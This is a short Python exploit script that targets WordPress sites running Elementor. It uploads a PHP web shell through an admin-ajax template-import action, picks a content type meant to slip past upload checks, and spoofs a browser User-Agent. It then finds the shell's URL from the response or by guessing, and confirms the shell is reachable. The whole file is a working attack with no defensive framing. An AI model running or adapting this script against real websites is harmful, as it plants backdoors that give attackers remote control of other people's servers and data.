import requests
import json
import os

def exploit(site_url):
    print(f"[*] Targeting: {site_url}")

    upload_url = f"{site_url}/wp-admin/admin-ajax.php?action=elementor_upload_and_import_template"
    
    if not os.path.exists('payloads/simple_shell.php'):
        print("[-] Shell payload not found at 'payloads/simple_shell.php'")
        return False, None

    files = {
        'file': ('shell.php', open('payloads/simple_shell.php', 'rb'), 'application/octet-stream')  # Octet-stream for better bypass chance
    }

    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
    }

    try:
        r = requests.post(upload_url, files=files, headers=headers, timeout=10)
        print(f"[+] Upload response code: {r.status_code}")

        # Try to parse JSON if Elementor responds that way
        try:
            res_json = r.json()
            if "url" in res_json:
                shell_url = res_json["url"]
                print(f"[+] Uploaded shell URL from response: {shell_url}")
            else:
                raise ValueError
        except:
            # Fallback to guessing
            shell_url = f"{site_url}/wp-content/uploads/elementor/shell.php"
            print("[*] Could not parse upload response, guessing path:", shell_url)

        # Check if the shell is accessible
        check = requests.get(shell_url, headers=headers, timeout=10)
        if check.status_code == 200:
            print(f"[âœ”] Shell uploaded and accessible at: {shell_url}")
            return True, shell_url
        else:
            print(f"[x] Shell uploaded but got {check.status_code} when accessing it.")
    except requests.exceptions.RequestException as e:
        print(f"[-] Request failed: {e}")

    print("[-] Exploit failed.")
    return False, None
